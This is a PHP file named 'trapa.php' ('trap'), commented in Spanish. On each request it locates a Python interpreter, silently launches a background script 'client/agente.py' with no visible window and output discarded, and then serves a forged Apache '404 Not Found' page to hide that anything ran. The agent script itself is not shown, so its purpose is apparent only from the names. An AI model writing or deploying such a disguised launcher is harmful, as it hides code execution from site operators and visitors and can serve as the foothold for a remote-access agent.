<?php
/**
 * TRAPA.PHP - Lanzador Automático Profesional
 */

$agente_path = __DIR__ . '/../client/agente.py';

function obtenerRutaPython() {
    // 1. Intentamos ver si 'python' responde directamente
    $check = shell_exec("python --version");
    if ($check) return "python";

    // 2. Si no, le preguntamos a Windows dónde está instalado
    $where = shell_exec("where python");
    if ($where) {
        $rutas = explode("\n", trim($where));
        return '"' . trim($rutas[0]) . '"'; // Retorna la primera ruta encontrada entre comillas
    }

    // 3. Rutas de emergencia por si 'where' falla
    $emergencia = [
        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python310\\python.exe",
        "C:\\Python310\\python.exe",
        "C:\\Python39\\python.exe"
    ];

    foreach ($emergencia as $ruta) {
        if (file_exists($ruta)) return '"' . $ruta . '"';
    }

    return "python"; 
}

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $python = obtenerRutaPython();
    // Ejecución silenciada sin ventana negra
    pclose(popen("start /B $python \"$agente_path\"", "r"));
} else {
    exec("python3 \"$agente_path\" > /dev/null 2>&1 &");
}

header("HTTP/1.1 404 Not Found");
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 150px; background: #fff; color: #000; }
        h1 { font-size: 50px; }
        p { font-size: 20px; }
        hr { max-width: 500px; border: 0; border-top: 1px solid #eee; }
    </style>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at localhost Port 80</address>
</body>
</html>
